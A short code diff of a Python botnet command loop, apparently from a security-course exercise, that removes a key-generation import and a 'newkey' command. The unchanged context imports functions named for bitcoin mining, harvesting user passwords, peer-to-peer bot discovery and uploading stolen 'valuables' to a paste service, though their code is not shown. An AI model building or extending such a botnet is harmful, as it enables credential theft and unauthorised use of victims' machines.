@@ -5,7 +5,6 @@ import threading
 from lib.evil import bitcoin_mine, harvest_user_pass
 from lib.p2p import find_bot, bot_server
 from lib.files import download_from_pastebot, filestore, p2p_upload_file, save_valuable, upload_valuables_to_pastebot, valuables
-from key_generator import generate_key
 
 def p2p_upload(fn):
     sconn = find_bot()
@@ -95,11 +94,6 @@ if __name__ == "__main__":
         elif cmd[0].lower() == "list":
             print("Files stored by this bot: %s" % ", ".join(filestore.keys()))
             print("Valuables stored by this bot: %s" % valuables)
-		# Generate new private and public key pair to be used for encryption in future.
-        elif cmd[0].lower() == "newkey":			
-            generate_key()
-            print("key generated")
-            print("done")			
         # Exit command
         elif cmd[0].lower() == "quit" or cmd[0].lower() == "exit":
             break
